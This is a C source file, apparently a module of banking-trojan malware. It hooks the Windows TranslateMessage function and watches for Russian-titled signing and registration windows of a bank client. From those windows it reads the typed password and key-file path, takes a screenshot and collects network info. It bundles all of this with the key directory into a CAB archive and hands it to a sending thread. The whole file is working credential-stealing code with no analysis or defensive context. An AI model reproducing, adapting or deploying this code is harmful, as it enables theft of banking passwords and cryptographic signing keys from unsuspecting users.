#include "Inist.h"
//#ifdef RuBnkH


typedef BOOL ( WINAPI *PINISTTranslateMessage )( const MSG *lpMsg );
PINISTTranslateMessage Real_INISTTranslateMessage;


void GetInist()
{

	char *szInistTitles[] = { "Регистрация пользователя", "Подпись данных", "Подпись и шифрование", 0 };

	HWND hInistForm = NULL;

	for ( DWORD i = 0; szInistTitles[i] != 0; i++ )
	{
		if ( ( hInistForm = (HWND)pFindWindowA( NULL, szInistTitles[i] ) ) != NULL )
		{
			break;
		}
	}

	if ( hInistForm != NULL )
	{

		HWND hFilePath = (HWND)pFindWindowExA( hInistForm, 0, "Combobox", 0 );

		if ( hFilePath )
		{
			hFilePath = (HWND)pFindWindowExA( hInistForm, hFilePath, "Combobox", 0 );
		}
		else
		{
			hFilePath = (HWND)pFindWindowExA( hInistForm, 0, "Edit", 0 );
		}

		HWND hPassword = (HWND)pFindWindowExA( hInistForm, hFilePath, "Edit", 0 );

		if ( !hFilePath || !hPassword )
		{
			return;
		}

		DWORD dwSize_1 = (DWORD)pSendMessageA( hFilePath, WM_GETTEXTLENGTH, 0, 0 ) + 1;
		DWORD dwSize_2 = (DWORD)pSendMessageA( hPassword, WM_GETTEXTLENGTH, 0, 0 ) + 1;

		if ( dwSize_1 > 1 && dwSize_2 > 1 )
		{
			char *FilePath = (char*)MemAlloc( dwSize_1 + 1 );
			char *Password = (char*)MemAlloc( dwSize_2 + 1 );

			pSendMessageA( hFilePath, WM_GETTEXT, dwSize_1, (LPARAM)FilePath );	
			pSendMessageA( hPassword, WM_GETTEXT, dwSize_2, (LPARAM)Password );	

			if ( !FilePath || !Password )
			{
				return;
			}

			if ( (DWORD)pGetFileAttributesA( FilePath ) == -1 )
			{
				return;
			}

			char Template[] = "Password: %s\r\n"
							  "Path: %s\r\n";

			char *Buffer = (char*)MemAlloc( 1024 );

			typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
			fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
			
			pwsprintfA( Buffer, Template, Password, FilePath );

			bool AddLog = false;

			char *TempFile = GetTempNameA();

			if ( TempFile )
			{
				HANDLE hLog = (HANDLE)pCreateFileA( TempFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

				if ( hLog != INVALID_HANDLE_VALUE )
				{
					DWORD dwWritten = 0;

					if ( (BOOL)pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 ) )
					{
						AddLog = true;
					}
				}

				pCloseHandle( hLog );
			}		

			MemFree( Buffer );

			LPVOID lpFile;
			DWORD dwFileSize;
			GetScreen( &lpFile, &dwFileSize );

			bool bAddScreen  = false;
			char *ScreenFile = GetTempNameA();

			if ( lpFile && ScreenFile )
			{
				HANDLE hScreen = (HANDLE)pCreateFileA( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

				if ( hScreen != INVALID_HANDLE_VALUE )
				{
					DWORD dwWritten = 0;

					if ( (BOOL)pWriteFile( hScreen, lpFile, dwFileSize, &dwWritten, 0 ) )
					{
						bAddScreen = true;
					}
				}

				pCloseHandle( hScreen );
			}			

			MemFree( lpFile );

			if ( AddLog )
			{
				char *Path = GetTempNameA();
				if ( Path )
				{
					HCAB hCab = CreateCab( Path );

					if ( hCab )
					{
						AddFileToCab( hCab, TempFile, "Information.txt" );

						if ( bAddScreen )
						{
							AddFileToCab( hCab, ScreenFile, "screen.jpeg" );
						}

						
						char *NetFile = GetNetInfo();

						if ( NetFile != NULL )
						{
							AddFileToCab( hCab, NetFile, "NetInfo.txt" );
							pDeleteFileA( NetFile );
						}

						MemFree( NetFile );

						AddDirToCab( hCab, FilePath, FilePath );
					}

					CloseCab( hCab );
					

					PBSSINIST pBank = (PBSSINIST)MemAlloc( sizeof( PBSSINIST ) );

					if ( pBank )
					{
						pBank->FilePath = (char*)MemAlloc( m_lstrlen( Path ) + 1 );
						pBank->dwType   = 3;
						m_memcpy( pBank->FilePath, Path, m_lstrlen( Path ) );
						StartThread( SendBSSInist, pBank );
					}
				}

				MemFree( Path );
			}

			pDeleteFileA( TempFile   );
			pDeleteFileA( ScreenFile );

			MemFree( TempFile	);
			MemFree( ScreenFile );				

			MemFree( Password );
			MemFree( FilePath  );
		
		}
	}

	return;
}


BOOL WINAPI Hook_INISTTranslateMessage( const MSG *lpMsg )
{
	if ( lpMsg->message == WM_LBUTTONUP && GetWindowID( lpMsg->hwnd ) == 1 )
	{
		GetInist();
	}
	
	return Real_INISTTranslateMessage ( lpMsg );
}

bool bInistHooked;

void InistHooks()
{
	if ( !bInistHooked )
	{
		UnhookTranslateMessage();

		if ( HookApi( 3, 0xC45D9631, (DWORD)&Hook_INISTTranslateMessage ) )
		{
			__asm mov [Real_INISTTranslateMessage], eax
		}

		bInistHooked = true;
	}

	return;
}
//#endif